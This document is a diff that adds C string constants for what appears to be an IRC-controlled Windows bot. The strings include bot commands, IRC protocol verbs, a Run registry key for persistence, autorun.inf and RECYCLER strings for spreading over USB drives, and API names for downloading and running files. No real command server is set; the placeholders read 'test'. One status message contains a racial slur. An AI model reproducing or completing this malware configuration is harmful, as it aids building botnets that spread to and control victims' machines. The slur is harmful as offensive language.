@@ -1,0 +1,73 @@
+    char cmd__RECONNECT[]          = "main.recon";  /* main.recon */
+    char cmd__REMOVAL[]            = "main.removal"; /* main.removal */
+    char cmd__JOIN[]               = "main.join"; /* main.join */
+    char cmd__PART[]               = "main.part"; /* main. part */
+    char *chan          = "#test";
+    char *chanps      = "test";
+    char *authost       = "test";
+  char exename[]              = "test.exe";
+    char regkey[]               = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    char regname[]              = "test";
+    char open[]                 = "open";
+    char *key13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+char my_usragent[] = "test";
+   char *NewInstall_Host = "";
+
+    char rcmsg[] = "reconecting";
+    char qtmsg[] = "Removing from Node.";
+    char wgerr[] = "error";
+    char wgrm[] = "removin da file nigga";
+char dld[] = "Downloaded:";
+char ns[] = "Failed to run file:";
+char rng[] = "File running:";
+char rdpcmd[] = "rdp.cmd";
+char USB_STR_RECYCLER[]   =		"\\RECYCLER";
+char USB_STR_REC_SUBDIR[]   =		"\\fire";
+char USB_STR_DESKTOP_INI[]   =		"\\Desktop.ini";
+char USB_STR_AUTORUN_INF[]   =		"\\AUTORUN.inf";
+char USB_STR_AUTORUN_DATA1[]   =	"[autorun]\r\nopen=";
+char USB_STR_AUTORUN_DATA2[]   =	"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command=";
+char USB_STR_AUTORUN_DATA3[]   =	"\r\nshell\\open\\default=1";
+char USB_STR_FILENAME[]   =		"test.exe";
+
+    /* IRC */
+    char str_nick[]                = "NICK";
+    char str_user[]                = "USER";
+    char str_privmsg[]             = "PRIVMSG";
+    char str_notice[]              = "NOTICE";
+    char str_pass[]                = "PASS";
+    char str_join[]                = "JOIN";
+    char str_part[]                = "PART";
+    char str_quit[]                = "QUIT";
+    char str_ping[]                = "PING";
+    char str_pong[]                = "PONG";
+    char str_my_443[]              = "443";
+    char str_my_332[]              = "332";
+
+    /* Shell32.dll */
+    char shell32_[]             = "shell32.dll";
+    char ShellExecute_[]        = "ShellExecuteA";
+
+    /* Advapi32.dll */
+    char advapi32_[]            = "Advapi32.dll";
+    char RegCreateKeyEx_[]      = "RegCreateKeyExA";
+    char RegSetValueEx_[]       = "RegSetValueExA";
+    char RegCloseKey_[]         = "RegCloseKey";
+
+    /* WS2_32.dll */
+    char WS2_32[]              = "WS2_32.dll";
+    char WSACleanup[]          = "WSACleanup";
+    char WSAStartup[]          = "WSAStartup";
+    char closesocket[]         = "closesocket";
+    char connect[]             = "connect";
+    char gethostbyname[]       = "gethostbyname";
+    char htons[]               = "htons";
+    char recv[]                = "recv";
+    char send[]                = "send";
+    char socket[]              = "socket";
+    char inet_addr[]           = "inet_addr";
+    char select[]              = "select";
+
+    /*UrlMon.dll */
+    char urlmon[]              = "urlmon.dll";
+    char URLDownloadToFile[]   = "URLDownloadToFileA";
